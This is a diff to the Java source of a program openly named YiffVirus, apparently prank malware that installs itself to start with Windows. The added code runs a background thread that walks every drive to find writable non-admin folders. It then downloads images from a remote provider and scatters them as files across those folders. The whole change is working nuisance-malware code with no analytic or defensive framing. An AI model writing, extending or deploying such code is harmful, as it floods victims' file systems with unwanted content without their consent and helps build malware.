@@ -5,6 +5,7 @@ import com.formdev.flatlaf.FlatDarculaLaf;
 import com.google.gson.Gson;
 import me.bannock.virus.images.ImageProviderService;
 import me.bannock.virus.images.impl.TestImageProviderService;
+import me.bannock.virus.utils.MiscUtils;
 import me.bannock.virus.utils.StartOnWindowsStartUtil;
 import me.bannock.virus.utils.WindowsUtils;
 
@@ -20,7 +21,10 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.nio.file.Files;
 import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.HashSet;
 import java.util.List;
+import java.util.Set;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -36,6 +40,8 @@ public class YiffVirus extends JFrame implements Runnable {
     public static final YiffVirus INSTANCE = new YiffVirus();
 
     protected static final File HEADLESS_CONFIG_FILE = new File(StartOnWindowsStartUtil.VIRUS_INSTALL_DIR, "msg.json");
+
+    private HashMap<File, File> fullyMappedDirs = null;
 
     /**
      * Creates a new gui window
@@ -113,24 +119,42 @@ public class YiffVirus extends JFrame implements Runnable {
 
         // Image flood
         if (config.shouldImageFlood()){
-            List<String> images = getImageProviderService().fetchImages(config.getImageAmount());
-            for (String url : images){
-                try {
-                    File imageFile = new File(userDesktopDir, Long.toString(System.nanoTime(), Character.MAX_RADIX) +
-                            "." + url.split("\\.")[url.split("\\.").length - 1]);
-                    if (config.shouldScatterAcrossDrive()){
-                        // TODO: Scatter across drive if enabled in the config
-                    }
-                    if (imageFile.exists())
-                        continue; // We don't want to accidentally write over another file
 
-                    // Write the image to the file
-                    Files.write(imageFile.toPath(), getImageProviderService().fetchBytes(url));
-                } catch (Exception ignored) {
-                    ignored.printStackTrace();
+            new Thread(() -> {
+                // Get a random non admin dir on drive to write to
+                if (config.shouldScatterAcrossDrive() && fullyMappedDirs == null){
+                    fullyMappedDirs = new HashMap<>();
+                    for (File drive : File.listRoots()){
+                        if (!drive.canExecute())
+                            continue;
+                        MiscUtils.getNonAdminDirectories(drive, fullyMappedDirs);
+                    }
                 }
 
-            }
+                // Get images
+                List<String> images = getImageProviderService().fetchImages(config.getImageAmount());
+                for (String url : images){
+                    try {
+                        File imageFile = new File(userDesktopDir, Long.toString(System.nanoTime(), Character.MAX_RADIX) +
+                                "." + url.split("\\.")[url.split("\\.").length - 1]);
+                        if (config.shouldScatterAcrossDrive()){
+                            // Select random dir to write to
+                            File dir = fullyMappedDirs.values().stream().skip((int)(Math.random() * fullyMappedDirs.size()) - 1).findFirst().get();
+                            imageFile = new File(dir, Long.toString(System.nanoTime(), Character.MAX_RADIX) +
+                                    "." + url.split("\\.")[url.split("\\.").length - 1]);
+                        }
+                        if (imageFile.exists())
+                            continue; // We don't want to accidentally write over another file
+
+                        // Write the image to the file
+                        Files.write(imageFile.toPath(), getImageProviderService().fetchBytes(url));
+                    } catch (Exception ignored) {
+                        ignored.printStackTrace();
+                    }
+
+                }
+            }).start();
+
         }
 
         // TODO: Set default user icon
